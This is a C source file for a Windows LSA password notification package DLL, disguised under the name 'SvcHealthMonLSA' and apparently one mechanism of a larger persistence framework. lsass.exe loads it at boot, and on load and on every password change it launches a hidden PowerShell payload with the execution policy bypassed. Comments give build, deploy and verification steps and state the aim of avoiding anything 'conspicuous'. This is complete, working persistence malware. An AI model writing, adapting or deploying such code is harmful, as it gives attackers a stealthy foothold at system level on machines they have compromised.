/*
 * SvcHealthMonLSA.c — LSA Notification Package DLL
 * Mechanism 9: loaded by lsass.exe at boot as a password notification package.
 *
 * BUILD (MSVC, from a Developer Command Prompt):
 *   cl /LD /O2 SvcHealthMonLSA.c /link /DEF:SvcHealthMonLSA.def kernel32.lib
 *
 * BUILD (MinGW/w64devkit, no separate .def needed):
 *   gcc -shared -O2 -o SvcHealthMonLSA.dll SvcHealthMonLSA.c \
 *       -Wl,--out-implib,SvcHealthMonLSA.lib -lkernel32
 *
 * DEPLOY:
 *   copy SvcHealthMonLSA.dll %WINDIR%\System32\
 *   (Registry entry already added by Invoke-PersistenceFramework.ps1 -Install)
 *   Reboot — lsass only loads packages at startup.
 *
 * VERIFY:
 *   After reboot, check C:\ProgramData\SvcHealthMonitor\keepalive.log
 *   for a line timestamped within the first few seconds of boot.
 */

#include <windows.h>
#include <ntsecapi.h>   /* UNICODE_STRING, PUNICODE_STRING, etc. */

/* ── Change this path if you move keepalive.ps1 ─────────────────────────── */
#define PAYLOAD_CMD \
    L"powershell.exe -NonInteractive -WindowStyle Hidden " \
    L"-ExecutionPolicy Bypass -File " \
    L"\"C:\\ProgramData\\SvcHealthMonitor\\keepalive.ps1\""

/* ── Internal helper: spawn the payload detached from lsass ─────────────── */
static void SpawnPayload(void)
{
    STARTUPINFOW        si  = { sizeof(si) };
    PROCESS_INFORMATION pi  = { 0 };

    /*
     * We make a mutable copy of the command string because CreateProcessW
     * may write into the lpCommandLine buffer internally.
     */
    WCHAR cmd[] = PAYLOAD_CMD;

    /*
     * DETACHED_PROCESS + CREATE_NO_WINDOW: the child has no console and is
     * fully detached from the lsass process tree, so killing lsass (which
     * you can't do anyway) would not kill our payload.
     */
    CreateProcessW(
        NULL,                               /* lpApplicationName  */
        cmd,                                /* lpCommandLine      */
        NULL,                               /* lpProcessAttributes */
        NULL,                               /* lpThreadAttributes */
        FALSE,                              /* bInheritHandles    */
        DETACHED_PROCESS | CREATE_NO_WINDOW,/* dwCreationFlags    */
        NULL,                               /* lpEnvironment      */
        NULL,                               /* lpCurrentDirectory */
        &si,
        &pi
    );

    /* Always close handles — lsass is a long-lived process and leaking
     * handles here would accumulate over many password-change events. */
    if (pi.hProcess) CloseHandle(pi.hProcess);
    if (pi.hThread)  CloseHandle(pi.hThread);
}

/* ── Required export 1 ───────────────────────────────────────────────────
 * InitializeChangeNotify
 *   Called exactly once when lsass loads our DLL at boot.
 *   This is our primary execution point.
 *   Must return TRUE — FALSE causes lsass to unload the package.
 */
BOOLEAN NTAPI InitializeChangeNotify(void)
{
    SpawnPayload();
    return TRUE;
}

/* ── Required export 2 ───────────────────────────────────────────────────
 * PasswordFilter
 *   Called synchronously before Windows commits a password change, to let
 *   the package approve or reject the new password.
 *   We always return TRUE (approve) — returning FALSE would block the user
 *   from changing their password, which would be very conspicuous.
 *
 *   Parameters (we ignore them all):
 *     AccountName  — the account whose password is changing
 *     FullName     — the account's full name
 *     Password     — the proposed new password (plaintext — handle with care)
 *     SetOperation — TRUE if administrator is setting the password directly
 */
BOOLEAN NTAPI PasswordFilter(
    PUNICODE_STRING AccountName,
    PUNICODE_STRING FullName,
    PUNICODE_STRING Password,
    BOOLEAN         SetOperation)
{
    (void)AccountName;
    (void)FullName;
    (void)Password;
    (void)SetOperation;
    return TRUE;    /* always approve */
}

/* ── Required export 3 ───────────────────────────────────────────────────
 * PasswordChangeNotify
 *   Called after a password change has been committed successfully.
 *   We use this as a secondary trigger — if the box is still running
 *   and someone changes a password, we re-run the keepalive payload.
 *   Return value: STATUS_SUCCESS (0).
 */
NTSTATUS NTAPI PasswordChangeNotify(
    PUNICODE_STRING UserName,
    ULONG           RelativeId,
    PUNICODE_STRING NewPassword)
{
    (void)UserName;
    (void)RelativeId;
    (void)NewPassword;
    SpawnPayload();     /* opportunistic re-trigger on any password event */
    return 0;           /* STATUS_SUCCESS */
}

/* ── DllMain ─────────────────────────────────────────────────────────────
 * Standard DLL entry point. We do nothing here — all work is in the
 * LSA-specific exports above. Returning FALSE from DllMain would prevent
 * the DLL from loading, so we always return TRUE.
 */
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason, LPVOID lpReserved)
{
    (void)hModule;
    (void)ul_reason;
    (void)lpReserved;
    return TRUE;
}
